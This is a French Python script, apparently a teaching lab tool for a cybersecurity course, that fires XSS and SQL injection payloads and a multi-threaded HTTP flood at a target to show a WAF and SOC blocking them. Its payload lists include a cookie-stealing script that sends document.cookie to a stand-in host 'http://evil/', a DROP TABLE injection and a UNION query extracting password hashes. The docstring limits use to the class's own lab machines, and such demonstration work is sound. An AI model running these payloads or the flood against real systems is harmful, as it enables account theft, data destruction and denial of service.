#!/usr/bin/env python3
"""Banc d'attaque de démonstration — PROJECT RESILIENCE-ALPHA (pôle Cybersécurité).

À EXÉCUTER UNIQUEMENT depuis le PC Attaquant, CONTRE le PC Hôte de VOTRE consortium.
Interdit : réseaux du campus, autres groupes, services tiers, Internet (cf. cahier des charges).
100 % fictif. Outil pédagogique volontairement simple (pas d'évasion, pas d'usurpation,
débit modéré) : il sert à rendre une attaque OBSERVABLE par la chaîne de détection.

Sous-commandes :
  xss    envoie des charges XSS/injection ; montre ce que le WAF bloque (403)
  ddos   flood HTTP applicatif contrôlé ; déclenche la limitation de débit + l'auto-ban BunkerWeb
  probe  exécute une transaction légitime (login -> paiement) ; prouve que le service répond

Exemples :
  python3 attack.py probe --target http://192.168.137.1
  python3 attack.py xss   --target http://192.168.137.1
  python3 attack.py ddos  --target http://192.168.137.1 --workers 25 --duration 25
"""
import argparse
import json
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from concurrent.futures import ThreadPoolExecutor

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<body onload=alert(document.cookie)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "'\"><script>document.location='http://evil/'+document.cookie</script>",
]
SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1; DROP TABLE transactions;--",
    "' UNION SELECT username,password_hash FROM users--",
    "1' OR SLEEP(5)--",
]


def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def request(method, url, host_header=None, data=None, token=None, timeout=5):
    headers = {"User-Agent": "resilience-labtest/1.0"}
    if host_header:
        headers["Host"] = host_header
    if token:
        headers["Authorization"] = "Bearer " + token
    if data is not None:
        data = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()


def cmd_probe(args):
    import os
    pw = args.password or os.getenv("DEMO_PASSWORD", "")
    if not pw:
        print("!! fournir --password (mot de passe de l'utilisateur fictif alice)"); return 2
    status, body = request("POST", f"{args.target}/api/auth/login", args.host_header,
                           {"username": args.user, "password": pw})
    if status != 200:
        print(f"login -> {status} (service KO ?)"); return 1
    token = json.loads(body)["access_token"]
    status, body = request("POST", f"{args.target}/api/payments", args.host_header,
                           {"amount": "4.20", "currency": "EUR", "merchant": "LAB-PROBE"}, token=token)
    ok = status == 201
    print(f"login -> 200 | paiement -> {status} | service {'DISPONIBLE' if ok else 'INDISPONIBLE'}")
    return 0 if ok else 1


def cmd_xss(args):
    print(f"== Injections XSS/SQLi vers {args.target} (403 = bloqué par le WAF)")
    blocked = passed = 0
    for p in XSS_PAYLOADS:
        url = f"{args.target}/?q=" + urllib.parse.quote(p)
        status, _ = request("GET", url, args.host_header)
        tag = "BLOQUÉ" if status == 403 else ("PASSÉ" if 200 <= status < 400 else f"HTTP {status}")
        if status == 403: blocked += 1
        elif 200 <= status < 400: passed += 1
        print(f"  XSS  {tag:7} <- {p[:50]}")
    for p in SQLI_PAYLOADS:
        url = f"{args.target}/api/payments?id=" + urllib.parse.quote(p)
        status, _ = request("GET", url, args.host_header)
        tag = "BLOQUÉ" if status == 403 else f"HTTP {status}"
        if status == 403: blocked += 1
        print(f"  SQLi {tag:7} <- {p[:50]}")
    print(f"== Bilan : {blocked} bloquées, {passed} passées")
    print("   (si des XSS passent : le WAF est en DetectionOnly -> voir la démo avant/après)")
    return 0


def cmd_ddos(args):
    print(f"== Flood HTTP contrôlé vers {args.target} : {args.workers} ouvriers, {args.duration}s")
    print("   Objectif : déclencher la limitation de débit (429) puis l'auto-ban BunkerWeb (403).")
    stop = time.time() + args.duration
    counts = Counter()
    lock = threading.Lock()
    paths = ["/", "/api/payments", "/?q=<script>alert(1)</script>"]

    def worker():
        i = 0
        while time.time() < stop:
            path = paths[i % len(paths)]
            status, _ = request("GET", f"{args.target}{path}", args.host_header, timeout=3)
            with lock:
                counts[status] += 1
            i += 1

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        for _ in range(args.workers):
            ex.submit(worker)
    total = sum(counts.values())
    print(f"== {total} requêtes envoyées (~{total / max(args.duration,1):.0f} req/s)")
    for code in sorted(counts):
        label = {200: "OK", 403: "bloqué/banni", 429: "limité", 0: "erreur/refus"}.get(code, "")
        print(f"   HTTP {code or 'ERR':>3} : {counts[code]:5}  {label}")
    if counts[403] or counts[429]:
        print("   -> Le WAF a limité/banni l'attaquant. Vérifier Grafana (SOC) et Wazuh (alerte DDoS).")
    return 0


def main():
    ap = argparse.ArgumentParser(description="Banc d'attaque de démonstration (lab uniquement).")
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("xss", "ddos", "probe"):
        p = sub.add_parser(name)
        p.add_argument("--target", required=True, help="ex. http://192.168.137.1")
        p.add_argument("--host-header", default=None, help="En-tête Host si nécessaire (ex. localhost en test local)")
        if name == "ddos":
            p.add_argument("--workers", type=int, default=25)
            p.add_argument("--duration", type=int, default=25)
        if name == "probe":
            p.add_argument("--user", default="alice")
            p.add_argument("--password", default=None)
    args = ap.parse_args()
    return {"xss": cmd_xss, "ddos": cmd_ddos, "probe": cmd_probe}[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
